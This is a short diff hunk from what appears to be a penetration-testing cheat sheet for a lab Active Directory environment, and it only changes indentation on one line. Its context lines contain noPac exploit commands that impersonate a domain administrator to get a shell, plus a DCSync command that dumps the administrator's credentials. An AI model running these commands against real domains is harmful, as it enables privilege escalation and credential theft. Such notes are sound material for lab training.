@@ -1692,7 +1692,7 @@ python3 scanner.py htb.local/svc_test:testpass -dc-ip 172.16.5.5 -use-ldap
 python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 -shell --impersonate administrator -use-ldap
 
 # DCSync
- python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
+python3 noPac.py htb.local/svc_test:testpass -dc-ip 172.16.5.5  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user htb.local/administrator
 ```
 
 ### ADCS
